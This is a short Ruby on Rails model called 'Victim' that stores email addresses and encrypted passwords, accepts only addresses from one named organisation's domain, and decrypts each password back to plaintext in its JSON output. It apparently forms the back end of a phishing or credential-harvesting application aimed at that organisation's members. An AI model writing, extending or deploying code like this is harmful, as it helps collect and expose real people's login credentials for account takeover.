class Victim < ApplicationRecord
  validates :email, :password, presence: true
  validates_format_of :email, with: /\A([^@\s]+)@(ucanchicago.org)\Z/i
  
  belongs_to :user

  def decrypt
    decrypt_pass = AESCrypt.decrypt(password, ENV["YOUR_FUNNY"])
  end

  def friendly_created_at
    created_at.strftime("%H:%M, %B %e, %Y")
  end


  def as_json
    {
      id: id,
      email: email,
      password: decrypt,
      method: method,
      created_at: friendly_created_at
    }
  end
end
